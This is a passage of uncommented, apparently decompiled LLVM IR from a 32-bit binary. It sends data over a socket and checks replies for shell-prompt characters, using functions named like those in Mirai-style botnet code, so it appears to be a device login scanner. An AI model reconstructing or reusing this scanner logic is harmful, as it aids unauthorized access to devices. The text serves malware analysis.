  %v1_804fbd2 = inttoptr i32 %v3_804fbd1 to i32*
  %v2_804fbd2 = load i32, i32* %v1_804fbd2, align 4
  store i32 %v2_804fbd2, i32* %edx.global-to-local, align 4
  %v1_804fbd3 = add i32 %v0_804fbd1, 1880
  store i32 %v1_804fbd3, i32* %eax.global-to-local, align 4
  store i32 %v1_804fbd3, i32* %v1_804fbd2, align 4
  store i32 25, i32* %v1_804fbd1, align 4
  %v0_804fbdd = load i32, i32* %stack_var_-16, align 4
  %v3_804fbdd = call i32 @table_retrieve_val(i32 %v0_804fbdd, i32* %v2_8050185)
  store i32 %v3_804fbdd, i32* %eax.global-to-local, align 4
  %v0_804fbe2 = load i32, i32* @esp, align 4
  %v1_804fbe2 = add i32 %v0_804fbe2, -4
  %v2_804fbe2 = inttoptr i32 %v1_804fbe2 to i32*
  store i32 16384, i32* %v2_804fbe2, align 4
  %v1_804fbe7 = add i32 %v0_804fbe2, 1880
  %v2_804fbe7 = inttoptr i32 %v1_804fbe7 to i32*
  %v3_804fbe7 = load i32, i32* %v2_804fbe7, align 4
  %v2_804fbee = add i32 %v0_804fbe2, -8
  %v3_804fbee = inttoptr i32 %v2_804fbee to i32*
  store i32 %v3_804fbe7, i32* %v3_804fbee, align 4
  %v2_804fbef = add i32 %v0_804fbe2, -12
  %v3_804fbef = inttoptr i32 %v2_804fbef to i32*
  store i32 %v3_804fbdd, i32* %v3_804fbef, align 4
  %v0_804fbf0 = load i32, i32* @esi, align 4
  %v1_804fbf0 = add i32 %v0_804fbf0, 4
  %v2_804fbf0 = inttoptr i32 %v1_804fbf0 to i32*
  %v3_804fbf0 = load i32, i32* %v2_804fbf0, align 4
  store i32 %v3_804fbf0, i32* @ebx, align 4
  %v2_804fbf3 = add i32 %v0_804fbe2, -16
  %v3_804fbf3 = inttoptr i32 %v2_804fbf3 to i32*
  store i32 %v3_804fbf0, i32* %v3_804fbf3, align 4
  %v0_804fbf4 = load i32, i32* %stack_var_-16, align 4
  %v4_804fbf4 = call i32 @__libc_send(i32 %v0_804fbf4, i32 %v0_804eda2, i32 %v0_804eda1, i32 %v0_804eda0)
  store i32 %v4_804fbf4, i32* %eax.global-to-local, align 4
  %v0_804fbf9 = load i32, i32* @esp, align 4
  %v1_804fbfc = add i32 %v0_804fbf9, 28
  %v2_804fbfc = inttoptr i32 %v1_804fbfc to i32*
  store i32 16384, i32* %v2_804fbfc, align 4
  %v1_804fc01 = add i32 %v0_804fbf9, 24
  %v2_804fc01 = inttoptr i32 %v1_804fc01 to i32*
  store i32 2, i32* %v2_804fc01, align 4
  %v1_804fc03 = add i32 %v0_804fbf9, 20
  %v2_804fc03 = inttoptr i32 %v1_804fc03 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8055866.17 to i32), i32* %v2_804fc03, align 4
  %v0_804fc08 = load i32, i32* @esi, align 4
  %v1_804fc08 = add i32 %v0_804fc08, 4
  %v2_804fc08 = inttoptr i32 %v1_804fc08 to i32*
  %v3_804fc08 = load i32, i32* %v2_804fc08, align 4
  store i32 %v3_804fc08, i32* %ecx.global-to-local, align 4
  %v2_804fc0b = add i32 %v0_804fbf9, 16
  %v3_804fc0b = inttoptr i32 %v2_804fc0b to i32*
  store i32 %v3_804fc08, i32* %v3_804fc0b, align 4
  %v0_804fc0c = load i32, i32* %stack_var_-16, align 4
  %v4_804fc0c = call i32 @__libc_send(i32 %v0_804fc0c, i32 %v0_804eda2, i32 %v0_804eda1, i32 %v0_804eda0)
  store i32 %v4_804fc0c, i32* %eax.global-to-local, align 4
  %v0_804fc11 = load i32, i32* @esp, align 4
  %v1_804fc11 = inttoptr i32 %v0_804fc11 to i32*
  store i32 25, i32* %v1_804fc11, align 4
  %v0_804fc18 = load i32, i32* %stack_var_-16, align 4
  %v1_804fc18 = trunc i32 %v0_804fc18 to i8
  %v2_804fc18 = call i32 @table_lock_val(i8 %v1_804fc18)
  store i32 %v2_804fc18, i32* %eax.global-to-local, align 4
  %v0_804fc20 = load i32, i32* @esi, align 4
  %v1_804fc20 = add i32 %v0_804fc20, 12
  %v2_804fc20 = inttoptr i32 %v1_804fc20 to i32*
  store i32 6, i32* %v2_804fc20, align 4
  br label %dec_label_pc_804f848

dec_label_pc_804fc2c:                             ; preds = %dec_label_pc_804f7b7
  %v1_804fc2c = add i32 %v0_804f7b7, 24
  %v2_804fc2c = inttoptr i32 %v1_804fc2c to i32*
  %v3_804fc2c = load i32, i32* %v2_804fc2c, align 4
  store i32 %v3_804fc2c, i32* %ecx.global-to-local, align 4
  %v1_804fc2f = add i32 %v3_804fc2c, -1
  store i32 %v1_804fc2f, i32* %eax.global-to-local, align 4
  %tmp172 = icmp slt i32 %v1_804fc2f, 1
  br i1 %tmp172, label %dec_label_pc_805002c, label %dec_label_pc_804fc3a

dec_label_pc_804fc3a:                             ; preds = %dec_label_pc_804fc2c
  %v2_804fc3a = add i32 %v0_804f7b7, 28
  %v3_804fc3a = add i32 %v1_804fc2f, %v2_804fc3a
  %v4_804fc3a = inttoptr i32 %v3_804fc3a to i8*
  %v5_804fc3a = load i8, i8* %v4_804fc3a, align 1
  %v6_804fc3a = zext i8 %v5_804fc3a to i32
  %v7_804fc3a = load i32, i32* @edx, align 4
  %v8_804fc3a = and i32 %v7_804fc3a, -256
  %v9_804fc3a = or i32 %v8_804fc3a, %v6_804fc3a
  store i32 %v9_804fc3a, i32* %edx.global-to-local, align 4
  %v10_804fc3e = icmp eq i8 %v5_804fc3a, 58
  br i1 %v10_804fc3e, label %dec_label_pc_804fc77, label %dec_label_pc_804fc43

dec_label_pc_804fc43:                             ; preds = %dec_label_pc_804fc3a
  %v10_804fc43 = icmp eq i8 %v5_804fc3a, 62
  br i1 %v10_804fc43, label %dec_label_pc_804fc77, label %dec_label_pc_804fc48

dec_label_pc_804fc48:                             ; preds = %dec_label_pc_804fc43
  %v10_804fc48 = icmp eq i8 %v5_804fc3a, 36
  br i1 %v10_804fc48, label %dec_label_pc_804fc77, label %dec_label_pc_804fc4d

dec_label_pc_804fc4d:                             ; preds = %dec_label_pc_804fc48
  %v3_804fc4d = add i32 %v3_804fc2c, %v2_804fc3a
  store i32 %v3_804fc4d, i32* %ecx.global-to-local, align 4
  %v10_804fc51 = icmp eq i8 %v5_804fc3a, 35
  %v1_804fc54 = icmp eq i1 %v10_804fc51, false
  br i1 %v1_804fc54, label %dec_label_pc_804fc68, label %dec_label_pc_804fc77

dec_label_pc_804fc58:                             ; preds = %dec_label_pc_804fc6f
  %v10_804fc58 = icmp eq i8 %v3_804fc6f, 62
  br i1 %v10_804fc58, label %dec_label_pc_804fc77, label %dec_label_pc_804fc5d

dec_label_pc_804fc5d:                             ; preds = %dec_label_pc_804fc58
  %v10_804fc5d = icmp eq i8 %v3_804fc6f, 36
  br i1 %v10_804fc5d, label %dec_label_pc_804fc77, label %dec_label_pc_804fc62

dec_label_pc_804fc62:                             ; preds = %dec_label_pc_804fc5d
  %v1_804fc62 = add i32 %v0_804fc62, -1
  store i32 %v1_804fc62, i32* %ecx.global-to-local, align 4
  %v10_804fc63 = icmp eq i8 %v3_804fc6f, 35
  br i1 %v10_804fc63, label %dec_label_pc_804fc77, label %dec_label_pc_804fc68

dec_label_pc_804fc68:                             ; preds = %dec_label_pc_804fc4d, %dec_label_pc_804fc62
  %v5_804fc6f = phi i32 [ %v7_804fc6f, %dec_label_pc_804fc62 ], [ %v9_804fc3a, %dec_label_pc_804fc4d ]
  %v0_804fc62 = phi i32 [ %v1_804fc62, %dec_label_pc_804fc62 ], [ %v3_804fc4d, %dec_label_pc_804fc4d ]
  %v0_804fc68 = phi i32 [ %v1_804fc68, %dec_label_pc_804fc62 ], [ %v1_804fc2f, %dec_label_pc_804fc4d ]
  %v1_804fc68 = add i32 %v0_804fc68, -1
  %v8_804fc68 = icmp eq i32 %v1_804fc68, 0
  store i32 %v1_804fc68, i32* %eax.global-to-local, align 4
  br i1 %v8_804fc68, label %dec_label_pc_805002c, label %dec_label_pc_804fc6f

dec_label_pc_804fc6f:                             ; preds = %dec_label_pc_804fc68
  %v1_804fc6f = add i32 %v0_804fc62, -2
  %v2_804fc6f = inttoptr i32 %v1_804fc6f to i8*
  %v3_804fc6f = load i8, i8* %v2_804fc6f, align 1
  %v4_804fc6f = zext i8 %v3_804fc6f to i32
  %v6_804fc6f = and i32 %v5_804fc6f, -256
  %v7_804fc6f = or i32 %v4_804fc6f, %v6_804fc6f
  store i32 %v7_804fc6f, i32* %edx.global-to-local, align 4
  %v10_804fc72 = icmp eq i8 %v3_804fc6f, 58
  %v1_804fc75 = icmp eq i1 %v10_804fc72, false
  br i1 %v1_804fc75, label %dec_label_pc_804fc58, label %dec_label_pc_804fc77

dec_label_pc_804fc77:                             ; preds = %dec_label_pc_804fc62, %dec_label_pc_804fc5d, %dec_label_pc_804fc58, %dec_label_pc_804fc6f, %dec_label_pc_804fc4d, %dec_label_pc_804fc48, %dec_label_pc_804fc43, %dec_label_pc_804fc3a
  %v0_804fc77 = phi i32 [ %v1_804fc2f, %dec_label_pc_804fc4d ], [ %v1_804fc2f, %dec_label_pc_804fc48 ], [ %v1_804fc2f, %dec_label_pc_804fc43 ], [ %v1_804fc2f, %dec_label_pc_804fc3a ], [ %v1_804fc68, %dec_label_pc_804fc6f ], [ %v1_804fc68, %dec_label_pc_804fc58 ], [ %v1_804fc68, %dec_label_pc_804fc5d ], [ %v1_804fc68, %dec_label_pc_804fc62 ]
  %v1_804fc77 = add i32 %v0_804fc77, 1
  store i32 %v1_804fc77, i32* @ebp, align 4
  %v0_804fc7e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804fc7a

dec_label_pc_804fc7a:                             ; preds = %dec_label_pc_8050075, %dec_label_pc_804fc77
  %v0_804fc7e = phi i32 [ %v1_805007f, %dec_label_pc_8050075 ], [ %v0_804fc7e.pre, %dec_label_pc_804fc77 ]
  %v0_804fc7a = phi i32 [ %v0_804fc7a.pre, %dec_label_pc_8050075 ], [ %v0_804f7b7, %dec_label_pc_804fc77 ]
  %v1_804fc7a = inttoptr i32 %v0_804fc7a to i32*
  %v2_804fc7a = load i32, i32* %v1_804fc7a, align 4
  store i32 %v2_804fc7a, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804fc7e = add i32 %v0_804fc7e, -4
  %v2_804fc7e = inttoptr i32 %v1_804fc7e to i32*
  store i32 16384, i32* %v2_804fc7e, align 4
  %v0_804fc83 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fc83 = add i32 %v0_804fc83, 13
  %v2_804fc83 = inttoptr i32 %v1_804fc83 to i8*
  %v3_804fc83 = load i8, i8* %v2_804fc83, align 1
  %v4_804fc83 = zext i8 %v3_804fc83 to i32
  %v5_804fc83 = load i32, i32* %eax.global-to-local, align 4
  %v6_804fc83 = and i32 %v5_804fc83, -256
  %v7_804fc83 = or i32 %v6_804fc83, %v4_804fc83
  store i32 %v7_804fc83, i32* %eax.global-to-local, align 4
  %v2_804fc86 = add i32 %v0_804fc7e, -8
  %v3_804fc86 = inttoptr i32 %v2_804fc86 to i32*
  store i32 %v7_804fc83, i32* %v3_804fc86, align 4
  %v0_804fc87 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fc87 = add i32 %v0_804fc87, 4
  %v2_804fc87 = inttoptr i32 %v1_804fc87 to i32*
  %v3_804fc87 = load i32, i32* %v2_804fc87, align 4
  %v2_804fc8a = add i32 %v0_804fc7e, -12
  %v3_804fc8a = inttoptr i32 %v2_804fc8a to i32*
  store i32 %v3_804fc87, i32* %v3_804fc8a, align 4
  %v0_804fc8b = load i32, i32* @esi, align 4
  %v1_804fc8b = add i32 %v0_804fc8b, 4
  %v2_804fc8b = inttoptr i32 %v1_804fc8b to i32*
  %v3_804fc8b = load i32, i32* %v2_804fc8b, align 4
  store i32 %v3_804fc8b, i32* @ebx, align 4
  %v2_804fc8e = add i32 %v0_804fc7e, -16
  %v3_804fc8e = inttoptr i32 %v2_804fc8e to i32*
  store i32 %v3_804fc8b, i32* %v3_804fc8e, align 4
  %v0_804fc8f = load i32, i32* %stack_var_-16, align 4
  %v4_804fc8f = call i32 @__libc_send(i32 %v0_804fc8f, i32 %v0_804eda2, i32 %v0_804eda1, i32 %v0_804eda0)
  store i32 %v4_804fc8f, i32* %eax.global-to-local, align 4
  %v0_804fc94 = load i32, i32* @esp, align 4
  %v1_804fc94 = add i32 %v0_804fc94, -4
  %v2_804fc94 = inttoptr i32 %v1_804fc94 to i32*
  store i32 16384, i32* %v2_804fc94, align 4
  %v1_804fc99 = add i32 %v0_804fc94, -8
  %v2_804fc99 = inttoptr i32 %v1_804fc99 to i32*
  store i32 2, i32* %v2_804fc99, align 4
  %v1_804fc9b = add i32 %v0_804fc94, -12
  %v2_804fc9b = inttoptr i32 %v1_804fc9b to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8055866.17 to i32), i32* %v2_804fc9b, align 4
  %v0_804fca0 = load i32, i32* @esi, align 4
  %v1_804fca0 = add i32 %v0_804fca0, 4
  %v2_804fca0 = inttoptr i32 %v1_804fca0 to i32*
  %v3_804fca0 = load i32, i32* %v2_804fca0, align 4
  store i32 %v3_804fca0, i32* %ecx.global-to-local, align 4
  %v2_804fca3 = add i32 %v0_804fc94, -16
  %v3_804fca3 = inttoptr i32 %v2_804fca3 to i32*
  store i32 %v3_804fca0, i32* %v3_804fca3, align 4
  %v0_804fca4 = load i32, i32* %stack_var_-16, align 4
  %v4_804fca4 = call i32 @__libc_send(i32 %v0_804fca4, i32 %v0_804eda2, i32 %v0_804eda1, i32 %v0_804eda0)
  store i32 %v4_804fca4, i32* %eax.global-to-local, align 4
  %v0_804fca9 = load i32, i32* @esi, align 4
  %v1_804fca9 = add i32 %v0_804fca9, 12
  %v2_804fca9 = inttoptr i32 %v1_804fca9 to i32*
  store i32 5, i32* %v2_804fca9, align 4
  br label %dec_label_pc_804fcb3

dec_label_pc_804fcb3:                             ; preds = %dec_label_pc_804fe03.thread, %dec_label_pc_804fe03, %dec_label_pc_80501c9, %dec_label_pc_804fe0b, %dec_label_pc_804fd3d, %dec_label_pc_804fc7a
  %v0_804fcb3 = load i32, i32* @ebp, align 4
  %v1_804fcb3 = icmp eq i32 %v0_804fcb3, 0
  %v1_804fcb5 = icmp eq i1 %v1_804fcb3, false
  br i1 %v1_804fcb5, label %dec_label_pc_804f848, label %dec_label_pc_804fcbb

dec_label_pc_804fcbb:                             ; preds = %dec_label_pc_804fcb3
  %v0_804fcbb = load i32, i32* @esi, align 4
  %v1_804fcbb = add i32 %v0_804fcbb, 12
  %v2_804fcbb = inttoptr i32 %v1_804fcbb to i32*
  %v3_804fcbb = load i32, i32* %v2_804fcbb, align 4
  store i32 %v3_804fcbb, i32* %eax.global-to-local, align 4
  %v1_804fcbe = icmp eq i32 %v3_804fcbb, 0
  %v1_804fcc0 = icmp eq i1 %v1_804fcbe, false
  br i1 %v1_804fcc0, label %dec_label_pc_804f74b, label %dec_label_pc_804fcc6

dec_label_pc_804fcc6:                             ; preds = %dec_label_pc_804f740.backedge, %dec_label_pc_804fcbb, %dec_label_pc_804f732, %dec_label_pc_804ffd2, %dec_label_pc_804f71f, %dec_label_pc_804f6e8, %dec_label_pc_8050402, %dec_label_pc_805023f, %dec_label_pc_805000a
  %v0_804fcc6 = load i32, i32* @esp, align 4
  %v1_804fcc6 = add i32 %v0_804fcc6, 1872
  %v2_804fcc6 = inttoptr i32 %v1_804fcc6 to i32*
  %v3_804fcc6 = load i32, i32* %v2_804fcc6, align 4
  %v1_804fccd = add i32 %v3_804fcc6, 1
  store i32 %v1_804fccd, i32* %eax.global-to-local, align 4
  store i32 %v1_804fccd, i32* %v2_804fcc6, align 4
  %v0_804fcd5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fcd5 = add i32 %v0_804fcd5, -255
  %v6_804fcd5 = sub i32 254, %v0_804fcd5
  %v7_804fcd5 = and i32 %v6_804fcd5, %v0_804fcd5
  %v8_804fcd5 = icmp slt i32 %v7_804fcd5, 0
  %v9_804fcd5 = icmp eq i32 %v1_804fcd5, 0
  %v10_804fcd5 = icmp slt i32 %v1_804fcd5, 0
  %v3_804fcda = icmp ne i1 %v10_804fcd5, %v8_804fcd5
  %v4_804fcda = or i1 %v9_804fcd5, %v3_804fcda
  br i1 %v4_804fcda, label %dec_label_pc_804f6e8, label %dec_label_pc_804f1d8

dec_label_pc_804fce5:                             ; preds = %dec_label_pc_804f7b7
  %v1_804fce5 = add i32 %v0_804f7b7, 24
  %v2_804fce5 = inttoptr i32 %v1_804fce5 to i32*
  %v3_804fce5 = load i32, i32* %v2_804fce5, align 4
  store i32 %v3_804fce5, i32* %ecx.global-to-local, align 4
  %v1_804fce8 = add i32 %v3_804fce5, -1
  store i32 %v1_804fce8, i32* %eax.global-to-local, align 4
  %tmp173 = icmp slt i32 %v1_804fce8, 1
  br i1 %tmp173, label %dec_label_pc_8050163, label %dec_label_pc_804fcf3

dec_label_pc_804fcf3:                             ; preds = %dec_label_pc_804fce5
  %v2_804fcf3 = add i32 %v0_804f7b7, 28
  %v3_804fcf3 = add i32 %v1_804fce8, %v2_804fcf3
  %v4_804fcf3 = inttoptr i32 %v3_804fcf3 to i8*
  %v5_804fcf3 = load i8, i8* %v4_804fcf3, align 1
  %v6_804fcf3 = zext i8 %v5_804fcf3 to i32
  %v7_804fcf3 = load i32, i32* @edx, align 4
  %v8_804fcf3 = and i32 %v7_804fcf3, -256
  %v9_804fcf3 = or i32 %v8_804fcf3, %v6_804fcf3
  store i32 %v9_804fcf3, i32* %edx.global-to-local, align 4
  %v10_804fcf7 = icmp eq i8 %v5_804fcf3, 58
  br i1 %v10_804fcf7, label %dec_label_pc_804fd3a, label %dec_label_pc_804fcfc

dec_label_pc_804fcfc:                             ; preds = %dec_label_pc_804fcf3
  %v10_804fcfc = icmp eq i8 %v5_804fcf3, 62
  br i1 %v10_804fcfc, label %dec_label_pc_804fd3a, label %dec_label_pc_804fd01

dec_label_pc_804fd01:                             ; preds = %dec_label_pc_804fcfc
  %v10_804fd01 = icmp eq i8 %v5_804fcf3, 36
  br i1 %v10_804fd01, label %dec_label_pc_804fd3a, label %dec_label_pc_804fd06

dec_label_pc_804fd06:                             ; preds = %dec_label_pc_804fd01
  %v10_804fd06 = icmp eq i8 %v5_804fcf3, 35
  br i1 %v10_804fd06, label %dec_label_pc_804fd3a, label %dec_label_pc_804fd0b

dec_label_pc_804fd0b:                             ; preds = %dec_label_pc_804fd06
  %v3_804fd0b = add i32 %v3_804fce5, %v2_804fcf3
  store i32 %v3_804fd0b, i32* %ecx.global-to-local, align 4
  %v10_804fd0f = icmp eq i8 %v5_804fcf3, 37
  %v1_804fd12 = icmp eq i1 %v10_804fd0f, false
  br i1 %v1_804fd12, label %dec_label_pc_804fd2b, label %dec_label_pc_804fd3a

dec_label_pc_804fd16:                             ; preds = %dec_label_pc_804fd32
  %v10_804fd16 = icmp eq i8 %v3_804fd32, 62
  br i1 %v10_804fd16, label %dec_label_pc_804fd3a, label %dec_label_pc_804fd1b

dec_label_pc_804fd1b:                             ; preds = %dec_label_pc_804fd16
  %v10_804fd1b = icmp eq i8 %v3_804fd32, 36
  br i1 %v10_804fd1b, label %dec_label_pc_804fd3a, label %dec_label_pc_804fd20

dec_label_pc_804fd20:                             ; preds = %dec_label_pc_804fd1b
  %v10_804fd20 = icmp eq i8 %v3_804fd32, 35
  br i1 %v10_804fd20, label %dec_label_pc_804fd3a, label %dec_label_pc_804fd25

dec_label_pc_804fd25:                             ; preds = %dec_label_pc_804fd20
  %v1_804fd25 = add i32 %v0_804fd25, -1
  store i32 %v1_804fd25, i32* %ecx.global-to-local, align 4
  %v10_804fd26 = icmp eq i8 %v3_804fd32, 37
  br i1 %v10_804fd26, label %dec_label_pc_804fd3a, label %dec_label_pc_804fd2b

dec_label_pc_804fd2b:                             ; preds = %dec_label_pc_804fd0b, %dec_label_pc_804fd25
  %v5_804fd32 = phi i32 [ %v7_804fd32, %dec_label_pc_804fd25 ], [ %v9_804fcf3, %dec_label_pc_804fd0b ]
  %v0_804fd25 = phi i32 [ %v1_804fd25, %dec_label_pc_804fd25 ], [ %v3_804fd0b, %dec_label_pc_804fd0b ]
  %v0_804fd2b = phi i32 [ %v1_804fd2b, %dec_label_pc_804fd25 ], [ %v1_804fce8, %dec_label_pc_804fd0b ]
  %v1_804fd2b = add i32 %v0_804fd2b, -1
  %v8_804fd2b = icmp eq i32 %v1_804fd2b, 0
  store i32 %v1_804fd2b, i32* %eax.global-to-local, align 4
  br i1 %v8_804fd2b, label %dec_label_pc_8050163, label %dec_label_pc_804fd32

dec_label_pc_804fd32:                             ; preds = %dec_label_pc_804fd2b
  %v1_804fd32 = add i32 %v0_804fd25, -2
  %v2_804fd32 = inttoptr i32 %v1_804fd32 to i8*
  %v3_804fd32 = load i8, i8* %v2_804fd32, align 1
  %v4_804fd32 = zext i8 %v3_804fd32 to i32
  %v6_804fd32 = and i32 %v5_804fd32, -256
  %v7_804fd32 = or i32 %v4_804fd32, %v6_804fd32
  store i32 %v7_804fd32, i32* %edx.global-to-local, align 4
  %v10_804fd35 = icmp eq i8 %v3_804fd32, 58
  %v1_804fd38 = icmp eq i1 %v10_804fd35, false
  br i1 %v1_804fd38, label %dec_label_pc_804fd16, label %dec_label_pc_804fd3a

dec_label_pc_804fd3a:                             ; preds = %dec_label_pc_804fd25, %dec_label_pc_804fd20, %dec_label_pc_804fd1b, %dec_label_pc_804fd16, %dec_label_pc_804fd32, %dec_label_pc_804fd0b, %dec_label_pc_804fd06, %dec_label_pc_804fd01, %dec_label_pc_804fcfc, %dec_label_pc_804fcf3
  %v0_804fd3a = phi i32 [ %v1_804fce8, %dec_label_pc_804fd0b ], [ %v1_804fce8, %dec_label_pc_804fd06 ], [ %v1_804fce8, %dec_label_pc_804fd01 ], [ %v1_804fce8, %dec_label_pc_804fcfc ], [ %v1_804fce8, %dec_label_pc_804fcf3 ], [ %v1_804fd2b, %dec_label_pc_804fd32 ], [ %v1_804fd2b, %dec_label_pc_804fd16 ], [ %v1_804fd2b, %dec_label_pc_804fd1b ], [ %v1_804fd2b, %dec_label_pc_804fd20 ], [ %v1_804fd2b, %dec_label_pc_804fd25 ]
  %v1_804fd3a = add i32 %v0_804fd3a, 1
  store i32 %v1_804fd3a, i32* @ebp, align 4
  %v0_804fd41.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804fd3d

dec_label_pc_804fd3d:                             ; preds = %dec_label_pc_80501c9.dec_label_pc_804fd3d_crit_edge, %dec_label_pc_804fd3a
  %v0_804fd41 = phi i32 [ %v1_80501df, %dec_label_pc_80501c9.dec_label_pc_804fd3d_crit_edge ], [ %v0_804fd41.pre, %dec_label_pc_804fd3a ]
  %v0_804fd3d = phi i32 [ %v0_804fd3d.pre, %dec_label_pc_80501c9.dec_label_pc_804fd3d_crit_edge ], [ %v0_804f7b7, %dec_label_pc_804fd3a ]
  %v1_804fd3d = inttoptr i32 %v0_804fd3d to i32*
  %v2_804fd3d = load i32, i32* %v1_804fd3d, align 4
  store i32 %v2_804fd3d, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804fd41 = add i32 %v0_804fd41, -4
  %v2_804fd41 = inttoptr i32 %v1_804fd41 to i32*
  store i32 16384, i32* %v2_804fd41, align 4
  %v0_804fd46 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fd46 = add i32 %v0_804fd46, 12
  %v2_804fd46 = inttoptr i32 %v1_804fd46 to i8*
  %v3_804fd46 = load i8, i8* %v2_804fd46, align 1
  %v4_804fd46 = zext i8 %v3_804fd46 to i32
  %v5_804fd46 = load i32, i32* %eax.global-to-local, align 4
  %v6_804fd46 = and i32 %v5_804fd46, -256
  %v7_804fd46 = or i32 %v6_804fd46, %v4_804fd46
  store i32 %v7_804fd46, i32* %eax.global-to-local, align 4
  %v2_804fd49 = add i32 %v0_804fd41, -8
  %v3_804fd49 = inttoptr i32 %v2_804fd49 to i32*
  store i32 %v7_804fd46, i32* %v3_804fd49, align 4
  %v0_804fd4a = load i32, i32* %edx.global-to-local, align 4
  %v1_804fd4a = inttoptr i32 %v0_804fd4a to i32*
  %v2_804fd4a = load i32, i32* %v1_804fd4a, align 4
  store i32 %v2_804fd4a, i32* %eax.global-to-local, align 4
  %v2_804fd4c = add i32 %v0_804fd41, -12
  %v3_804fd4c = inttoptr i32 %v2_804fd4c to i32*
  store i32 %v2_804fd4a, i32* %v3_804fd4c, align 4
  %v0_804fd4d = load i32, i32* @esi, align 4
  %v1_804fd4d = add i32 %v0_804fd4d, 4
  %v2_804fd4d = inttoptr i32 %v1_804fd4d to i32*
  %v3_804fd4d = load i32, i32* %v2_804fd4d, align 4
  store i32 %v3_804fd4d, i32* %eax.global-to-local, align 4
  %v2_804fd50 = add i32 %v0_804fd41, -16
  %v3_804fd50 = inttoptr i32 %v2_804fd50 to i32*
  store i32 %v3_804fd4d, i32* %v3_804fd50, align 4
  %v0_804fd51 = load i32, i32* %stack_var_-16, align 4
  %v4_804fd51 = call i32 @__libc_send(i32 %v0_804fd51, i32 %v0_804eda2, i32 %v0_804eda1, i32 %v0_804eda0)
  store i32 %v4_804fd51, i32* %eax.global-to-local, align 4
  %v0_804fd56 = load i32, i32* @esp, align 4
  %v1_804fd56 = add i32 %v0_804fd56, -4
  %v2_804fd56 = inttoptr i32 %v1_804fd56 to i32*
  store i32 16384, i32* %v2_804fd56, align 4
  %v1_804fd5b = add i32 %v0_804fd56, -8
  %v2_804fd5b = inttoptr i32 %v1_804fd5b to i32*
  store i32 2, i32* %v2_804fd5b, align 4
  %v1_804fd5d = add i32 %v0_804fd56, -12
  %v2_804fd5d = inttoptr i32 %v1_804fd5d to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8055866.17 to i32), i32* %v2_804fd5d, align 4
  %v0_804fd62 = load i32, i32* @esi, align 4
  %v1_804fd62 = add i32 %v0_804fd62, 4
  %v2_804fd62 = inttoptr i32 %v1_804fd62 to i32*
  %v3_804fd62 = load i32, i32* %v2_804fd62, align 4
  store i32 %v3_804fd62, i32* %eax.global-to-local, align 4
  %v2_804fd65 = add i32 %v0_804fd56, -16
  %v3_804fd65 = inttoptr i32 %v2_804fd65 to i32*
  store i32 %v3_804fd62, i32* %v3_804fd65, align 4
  %v0_804fd66 = load i32, i32* %stack_var_-16, align 4
  %v4_804fd66 = call i32 @__libc_send(i32 %v0_804fd66, i32 %v0_804eda2, i32 %v0_804eda1, i32 %v0_804eda0)
  store i32 %v4_804fd66, i32* %eax.global-to-local, align 4
  %v0_804fd6e = load i32, i32* @esi, align 4
  %v1_804fd6e = add i32 %v0_804fd6e, 12
  %v2_804fd6e = inttoptr i32 %v1_804fd6e to i32*
  store i32 4, i32* %v2_804fd6e, align 4
  br label %dec_label_pc_804fcb3

dec_label_pc_804fd7a:                             ; preds = %dec_label_pc_804f7b7
  %v1_804fd7a = add i32 %v0_804f7b7, 24
  %v2_804fd7a = inttoptr i32 %v1_804fd7a to i32*
  %v3_804fd7a = load i32, i32* %v2_804fd7a, align 4
  store i32 %v3_804fd7a, i32* %edx.global-to-local, align 4
  %v0_804fd7d = load i32, i32* @esp, align 4
  %v1_804fd7d = add i32 %v0_804fd7d, 24
  %v2_804fd7d = inttoptr i32 %v1_804fd7d to i32*
  %v3_804fd7d = load i32, i32* %v2_804fd7d, align 4
  store i32 %v3_804fd7d, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v2_804fd8322 = sub i32 0, %v3_804fd7a
  %v10_804fd8326 = and i32 %v3_804fd7a, %v2_804fd8322
  %v11_804fd8327 = icmp slt i32 %v10_804fd8326, 0
  %v13_804fd8329 = icmp slt i32 %v2_804fd8322, 0
  %v2_804fd8530 = icmp eq i1 %v13_804fd8329, %v11_804fd8327
  br i1 %v2_804fd8530, label %dec_label_pc_804fe03.thread, label %dec_label_pc_804fd87.preheader

dec_label_pc_804fe03.thread:                      ; preds = %dec_label_pc_804fd7a
  br label %dec_label_pc_804fcb3

dec_label_pc_804fd87.preheader:                   ; preds = %dec_label_pc_804fd7a, %dec_label_pc_804fd83.backedge
  %v0_804fe0b123 = phi i32 [ %v0_804fe0b125, %dec_label_pc_804fd83.backedge ], [ %v0_804f7b7, %dec_label_pc_804fd7a ]
  %v0_804fe1a116 = phi i32 [ %v0_804fd83, %dec_label_pc_804fd83.backedge ], [ 0, %dec_label_pc_804fd7a ]
  %v5_804fd99103 = phi i32 [ %v5_804fd99104, %dec_label_pc_804fd83.backedge ], [ %v3_804f7b7, %dec_label_pc_804fd7a ]
  %v1_804fd93101 = phi i32 [ %v1_804fd83, %dec_label_pc_804fd83.backedge ], [ %v3_804fd7a, %dec_label_pc_804fd7a ]
  %v0_804fd8c98 = phi i32 [ %v0_804fd8c99, %dec_label_pc_804fd83.backedge ], [ %v0_804fd7d, %dec_label_pc_804fd7a ]
  br label %dec_label_pc_804fd87

dec_label_pc_804fd87:                             ; preds = %dec_label_pc_804fd87.preheader, %dec_label_pc_804fde2
  %v0_804fe0b126 = phi i32 [ %v0_804fe0b123, %dec_label_pc_804fd87.preheader ], [ %v0_804fdf9, %dec_label_pc_804fde2 ]
  %v0_804fe1a = phi i32 [ %v0_804fe1a116, %dec_label_pc_804fd87.preheader ], [ %v0_804fdff, %dec_label_pc_804fde2 ]
  %v5_804fd99 = phi i32 [ %v5_804fd99103, %dec_label_pc_804fd87.preheader ], [ %v4_804fdf4, %dec_label_pc_804fde2 ]
  %v1_804fd93 = phi i32 [ %v1_804fd93101, %dec_label_pc_804fd87.preheader ], [ %v3_804fdf9, %dec_label_pc_804fde2 ]
